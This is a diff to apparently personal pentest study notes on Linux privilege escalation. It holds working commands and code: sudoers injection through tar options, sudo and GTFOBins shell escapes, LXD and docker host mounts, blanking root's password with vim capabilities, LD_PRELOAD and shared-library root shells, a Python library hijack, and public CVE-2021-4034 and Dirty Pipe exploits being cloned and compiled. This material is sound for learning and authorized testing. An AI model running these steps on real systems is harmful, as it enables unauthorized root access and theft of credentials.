@@ -151,17 +151,6 @@ find / -type f \( -name *_hist -o -name *_history \) -exec ls -l {} \; 2>/dev/nu
    ps aux | grep root
 ```
 
-###### Credential Hunting
-- When enumerating a system, it is important to note down any credentials. These may be found in configuration files (.conf, .config, .xml, etc.), shell scripts, a user's bash history file, backup (.bak)
-
-```bash
-find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null
-
-# ssh keys
- ls ~/.ssh
-```
-
-
 ## Environment-based Privilege Escalation
 
 ###### Path Abuse
@@ -196,7 +185,7 @@ ls
   - --checkpoint=1 and --checkpoint-action=exec=sh root.sh is passed to tar as command-line options.
 
   ```bash
-  echo 'echo "cliff.moore ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh
+   echo 'echo "cliff.moore ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh
 
   echo "" > "--checkpoint-action=exec=sh root.sh"
 
@@ -206,141 +195,39 @@ ls
   ```
 
 ###### Escaping Restricted Shells
+- In a restricted shell, the user is only allowed to execute a specific set of commands or only allowed to execute commands in specific directories. 
 
-- Restricted shell : `rbash, rksh, rzsh`
-
-- Command injection : 
+- Restricted shell : `rbash, rksh, rzsh...`
+**Techniques de bypass**
+- `Command injection` : 
+    - Imagine that we are in a restricted shell that allows us to execute commands by passing them as arguments to the ls command. 
   ```bash
   ls -l `pwd`
+  # readfile
+  echo "$(<FileToReadName.txt )"
+  while read line; do echo $line; done < <FilePath>; echo $line
   ```
+- `command substitution` : This involves using the shell's command substitution syntax to execute a command. 
 
-- command substitution : This involves using the shell's command substitution syntax to execute a command. 
+- In some cases, it may be possible to escape from a restricted shell by using  `command chaining`.
 
-- In some cases, it may be possible to escape from a restricted shell by using command chaining.
+- it may be possible to escape from a restricted shell by using `shell functions`
 
-- it may be possible to escape from a restricted shell by using shell functions
-
-## Permissions-based Privilege Escalation
-
-###### Special Permissions
-
-- The Set User ID upon Execution (setuid) permission can allow a user to execute a program or script with the permissions of another user, typically with elevated privileges. The setuid bit appears as an s.
-
-  ```bash
-  # find vulnerable file 
-  find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
-
-  or 
-
-  find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null
-  ```
-  [Ressource link](https://linuxconfig.org/how-to-use-special-permissions-the-setuid-setgid-and-sticky-bits)
-
-- use gtfoBins 
-
-  ```bash
-  sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
-
-  id
-  ```
-
-
-###### Sudo Rights Abuse
+###### Credential Hunting
+- When enumerating a system, it is important to note down any credentials. These may be found in configuration files (.conf, .config, .xml, etc.), shell scripts, a user's bash history file, backup (.bak)
 
 ```bash
-sudo -l
+find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null
 
-# exemple of tcpdump which use root priv without password
- sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root
-
-
+# ssh keys
+ ls ~/.ssh
 ```
-
-###### Privileged Groups
-
-- LXD is similar to Docker and is Ubuntu's container manager. Upon installation, all users are added to the LXD group. Membership of this group can be used to escalate privileges by creating an LXD container, making it privileged, and then accessing the host file system at /mnt/root. Let's confirm group membership and use these rights to escalate to root.
-
-  ```bash
-  # initilisation
-  lxd init
-
-  # Import the local image.
-  lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine
-
-  ```
-- Start a privileged container with the security.privileged set to true to run the container without a UID mapping, making the root user in the container the same as the root user on the host.
-
-  ```bash
-  lxc init alpine r00t -c security.privileged=true
-
-  # Mount the host file system.
-  lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true
-
-  # spawn
-  lxc start r00t
-  lxc exec r00t /bin/sh
-  ```
-
-- Placing a user in the docker group is essentially equivalent to root level access to the file system without requiring a password. 
-
-  ```bash
-  docker run -v /root:/mnt -it ubuntu
-  ```
-
-- Users within the disk group have full access to any devices contained within <Path>
-
-- Members of the adm group are able to read all logs stored in /var/log. This does not directly grant root access, but could be leveraged to gather sensitive data stored in log files or enumerate user actions and running cron jobs.
-
-###### Capabilities
-- Linux capabilities are a security feature in the Linux operating system that allows specific privileges to be granted to processes, allowing them to perform specific actions that would otherwise be restricted
-- One common vulnerability is using capabilities to grant privileges to processes that are not adequately sandboxed or isolated from other processes, allowing us to escalate their privileges and gain access to sensitive information or perform unauthorized actions.
-- Another potential vulnerability is the misuse or overuse of capabilities, which can result in processes having more privileges than they need
-   
-  - We could use the following command to set the cap_net_bind_service capability for an executable:
-  ```bash
-  sudo setcap cap_net_bind_service=+ep /usr/bin/vim.basic
-  ```
-  - the cap_net_bind_service capability is set for a binary, the binary will be able to bind to network ports, which is a privilege usually restricted.
-
-!["Capabilities img"](../Ressources/IMG/linux-priv-esc-capabilities.png)
-
-!["Capabilities img"](../Ressources/IMG/linux-priv-esc-capabilities-2.png)
-
-!["Capabilities img"](../Ressources/IMG/linux-priv-esc-capabilities-3.png)
-
--  To enumerate all existing capabilities for all existing binary executables on a Linux system, we can use the following command:
-
-  ```bash
-  find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;
-  ```
-
-- If we gained access to the system with a low-privilege account, then discovered the dac_cap_override capability:
-
-  ```bash
-  getcap /usr/bin/vim.basic
-  
-  cat /etc/passwd | head -n1
-  # We can use the cap_dac_override capability of the /usr/bin/vim binary to modify a system file:
-
-  /usr/bin/vim.basic /etc/passwd
-
-
-  # alternative
-  echo -e ':%s/^root:[^:]*:/root::/\nwq' | /usr/bin/vim.basic -es /etc/passwd
-
-  cat /etc/passwd | head -n1
-  ```
-
-
-**Ressources**
-    [Hacktrick capabilities](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities)
-    [Linux capabilities doc](https://man7.org/linux/man-pages/man7/capabilities.7.html)
 
 
 ## Service-based Privilege Escalation
 
 ###### Vulnerable Services
-- Many services may be found, which have flaws that can be leveraged to escalate privileges : ex => screen
+- Many services may be found, which have flaws that can be leveraged to escalate privileges : ex => screen version 4.5.0 [(sh exploit)](https://github.com/XiphosResearch/exploits/blob/master/screen2root/screenroot.sh)
 - List services running on the laptop
 
  ```bash
@@ -604,6 +491,130 @@ ls -la /shareds
 tmux -S /shareds
 ```
 
+## Permissions-based Privilege Escalation
+
+###### Special Permissions
+
+- The Set User ID upon Execution (setuid) permission can allow a user to execute a program or script with the permissions of another user, typically with elevated privileges. The setuid bit appears as an s.
+
+  ```bash
+  # find vulnerable file 
+  find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
+
+  or 
+
+  find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null
+  ```
+  [Ressource link](https://linuxconfig.org/how-to-use-special-permissions-the-setuid-setgid-and-sticky-bits)
+
+- use gtfoBins 
+
+  ```bash
+  sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
+
+  id
+  ```
+
+
+###### Sudo Rights Abuse
+
+```bash
+sudo -l
+
+# exemple of tcpdump which use root priv without password
+ sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root
+# -z => execute shell script
+# modify /tmp/test to do a reverse shell
+cat /tmp/.test
+# rerun it and do a listenner in attacker box
+
+```
+
+###### Privileged Groups
+
+- LXD is similar to Docker and is Ubuntu's container manager. Upon installation, all users are added to the LXD group. Membership of this group can be used to escalate privileges by creating an LXD container, making it privileged, and then accessing the host file system at /mnt/root. Let's confirm group membership and use these rights to escalate to root.
+
+  ```bash
+  # initilisation
+  lxd init
+
+  # Import the local image.
+  lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine
+
+  ```
+- Start a privileged container with the security.privileged set to true to run the container without a UID mapping, making the root user in the container the same as the root user on the host.
+
+  ```bash
+  lxc init alpine r00t -c security.privileged=true
+
+  # Mount the host file system.
+  lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true
+
+  # spawn
+  lxc start r00t
+  lxc exec r00t /bin/sh
+  ```
+
+- Placing a user in the docker group is essentially equivalent to root level access to the file system without requiring a password. 
+
+  ```bash
+  docker run -v /root:/mnt -it ubuntu
+  ```
+
+- Users within the disk group have full access to any devices contained within <Path>
+
+- Members of the adm group are able to read all logs stored in /var/log. This does not directly grant root access, but could be leveraged to gather sensitive data stored in log files or enumerate user actions and running cron jobs.
+
+###### Capabilities
+- Linux capabilities are a security feature in the Linux operating system that allows specific privileges to be granted to processes, allowing them to perform specific actions that would otherwise be restricted
+- One common vulnerability is using capabilities to grant privileges to processes that are not adequately sandboxed or isolated from other processes, allowing us to escalate their privileges and gain access to sensitive information or perform unauthorized actions.
+- Another potential vulnerability is the misuse or overuse of capabilities, which can result in processes having more privileges than they need
+   
+  - We could use the following command to set the cap_net_bind_service capability for an executable:
+  ```bash
+  sudo setcap cap_net_bind_service=+ep /usr/bin/vim.basic
+  ```
+  - the cap_net_bind_service capability is set for a binary, the binary will be able to bind to network ports, which is a privilege usually restricted.
+
+!["Capabilities img"](../Ressources/IMG/linux-priv-esc-capabilities.png)
+
+!["Capabilities img"](../Ressources/IMG/linux-priv-esc-capabilities-2.png)
+
+!["Capabilities img"](../Ressources/IMG/linux-priv-esc-capabilities-3.png)
+
+-  To enumerate all existing capabilities for all existing binary executables on a Linux system, we can use the following command:
+
+  ```bash
+  find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;
+  ```
+
+- If we gained access to the system with a low-privilege account, then discovered the dac_cap_override capability:
+
+  ```bash
+  getcap /usr/bin/vim.basic
+  
+  cat /etc/passwd | head -n1
+  # We can use the cap_dac_override capability of the /usr/bin/vim binary to modify a system file:
+  /usr/bin/vim.basic /etc/passwd
+        # then modify the root ( ligne 1) line with vim
+        # delete the x ( root:x:0:0 => root::0:0)
+
+  #Now, we can see that the x in that line is gone, which means that 
+  #we can use the command su to log in as root without being asked 
+  #for the password.
+
+  # alternative
+  echo -e ':%s/^root:[^:]*:/root::/\nwq' | /usr/bin/vim.basic -es /etc/passwd
+
+  cat /etc/passwd | head -n1
+  ```
+
+
+**Ressources**
+    [Hacktrick capabilities](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities)
+    [Linux capabilities doc](https://man7.org/linux/man-pages/man7/capabilities.7.html)
+
+
 ## Linux Internals-based Privilege Escalation
 
 ###### Kernel Exploits
@@ -636,6 +647,9 @@ gcc kernel_exploit.c -o kernel_exploit && chmod +x kernel_exploit
 
 
 ```bash
+### requirements
+ld_preload have to be active ( verify with sudo -l)
+being allowed to run a cmd ( verify with sudo -l)
 #  lists all the libraries required by /bin/ls
 ldd /bin/ls
 
@@ -659,6 +673,9 @@ system("/bin/bash");
 ```bash
 # compile 
 gcc -fPIC -shared -o root.so root.c -nostartfiles
+# move the file to /tmp/<fileName>
+# run 
+sudo LD_PRELOAD=/tmp/<FileInTMPFOLDER> <CMDUtilisable>
 ```
 
 ###### Shared Object Hijacking
@@ -668,14 +685,14 @@ gcc -fPIC -shared -o root.so root.c -nostartfiles
     ```
 - Inspect run path
     ```bash
-    readelf -d <FileName>  | grep PATH
+    readelf -d <BinaryFileName>  | grep PATH
     ```
 - create a shell root
     ```c
     #include<stdio.h>
     #include<stdlib.h>
     
-    void dbquery() {
+    void < NomFonctionManquante | dbquery>() {
         printf("Malicious library loaded\n");
         setuid(0);
         system("/bin/sh -p");
@@ -685,6 +702,7 @@ gcc -fPIC -shared -o root.so root.c -nostartfiles
     - ```bash
       gcc src.c -fPIC -shared -o < RunPath/objectName | /development/libshared.so>
       ```
+- run the file or binary
 
 ###### Python Library Hijacking
 
@@ -710,11 +728,29 @@ There are three basic vulnerabilities where hijacking can be used:
         ```bash
         ls -l <VulnerableFunctionSourceFilePath>
         ```
-    5. Modify function by inserting a reverse shell to our main device
+    5. Modify function by inserting a reverse shell to our main device 
+        ```python
+        import os
+	    os.system('id')
 
+
+        # or 
+        while True:
+        user_input = input("Enter a command (or 'exit' to quit): ")
+        
+        if user_input.lower() == "exit":
+            break
+        
+        try:
+            output = os.popen(user_input).read()
+            print(output)
+        except Exception as e:
+            print(str(e))
+        ```
+        
     <br/>
-
 - Library Path
+
 ```bash
 #1. show installation location of file
 pip3 show <libName>
@@ -726,11 +762,12 @@ ls -la <DirName>
 ```
 
 - PYTHONPATH Environment Variable
+
 ```bash
 # see if we can use python with sudo
 sudo -l
 # set my own 
-sudo PYTHONPATH=<Path | /tmp/ > <PythonPath | /usr/bin/python3> <LibFileName>
+sudo PYTHONPATH=/tmp/ <PythonPath | /usr/bin/python3> <LibFileName>
 ```
 
 
@@ -764,6 +801,7 @@ make
 #Prerequist : It had to allow a user in the /etc/sudoers file to execute a specific command.
 cat /etc/passwd | grep <UserName>
 sudo -u#-1 <CmdAllowed>
+# if it is ncdu cmd , can press "b" inside interface to basculate to shell and do what you want with other cmd
 ```
 
 ###### Polkit
@@ -785,12 +823,17 @@ Polkit works with two groups of files.
 ```bash
 # pkexec -u <user> <command>
 # it uses  CVE-2021-4034
-# find poc on github and use it 
+# find poc on github and use it
+git clone https://github.com/arthepsy/CVE-2021-4034.git
+cd CVE-2021-4034
+gcc cve-2021-4034-poc.c -o poc
+./poc 
 ```
 
 ###### Dirty Pipe
 - CVE-2022-0847
 - In simple terms, this vulnerability allows a user to write to arbitrary files as long as he has read access to these files. It is also interesting to note that Android phones are also affected.
+- All kernels from version 5.8 to 5.17 are affected and vulnerable to this vulnerability.
 ```bash
 # exploit 
 git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits.git
@@ -818,11 +861,10 @@ bash compile.sh
 - When the module is activated, all IP packets are checked by the Netfilter before they are forwarded to the target application of the own or remote system. 
 - `CVE-2021-22555 => Vulnerable kernel versions: 2.6 - 5.11`
 -  `CVE-2022-1015`
--  `CVE-2023-32233` 
 - ` CVE-2022-25636 => affects Linux kernel 5.4 through 5.6.10. ` => see Nick Gregory article
     - called anonymous sets in nf_tables by using the Use-After-Free vulnerability in the Linux Kernel up to version 6.3.1. These nf_tables are temprorary workspaces for processing batch requests and once the processing is done, these anonymous sets are supposed to be cleared out (Use-After-Free) so they cannot be used anymore.
-- `CVE-2023-32233` 
-- 
+- `CVE-2023-32233 => Linux Kernel up to version 6.3.1` 
+
 ## Hardening Considerations ( durcissement )
 
 -  Linux hardening can eliminate most, if not all, opportunities for local privilege escalation
@@ -847,9 +889,8 @@ bash compile.sh
 - Pentest
 - box-checking
 - use Lynis tool ( github )
+
 ## Ressources
-
 - [LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)
-
 - [LinEnum](https://github.com/rebootuser/LinEnum)
 - [GTFOBIN](https://gtfobins.github.io/)
